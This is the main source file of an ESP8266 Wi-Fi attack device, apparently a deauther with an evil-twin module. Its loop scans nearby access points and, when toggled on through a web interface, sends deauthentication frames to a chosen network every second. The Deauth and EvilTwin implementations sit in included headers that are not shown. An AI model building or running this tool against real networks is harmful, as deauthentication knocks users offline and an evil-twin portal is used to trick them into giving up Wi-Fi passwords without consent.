#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "ScanAp.h"
#include "WebServ.h"
#include "Utils.h"
#include "Deauth.h"
#include "EvilTwin.h"

WebServ webServ;
unsigned long deauth_now = 0;
unsigned long now = 0;
unsigned long wifinow = 0;

void setup()
{
    webServ.setupServer();
}

void loop()
{
    webServ.handleClient();

    if (webServ.isDeauthingActive() && millis() - deauth_now >= 1000)
    {
        webServ.getDeauth().performDeauth(webServ.getSelectedNetwork().bssid, webServ.getSelectedNetwork().ch);
        deauth_now = millis();
    }

    if (millis() - now >= 18000)
    {
        webServ.getScanAp().performScan();
        now = millis();
    }

    if (millis() - wifinow >= 2000)
    {
        if (WiFi.status() != WL_CONNECTED)
        {
            Serial.println("BAD");
        }
        else
        {
            Serial.println("GOOD");
        }
        wifinow = millis();
    }
}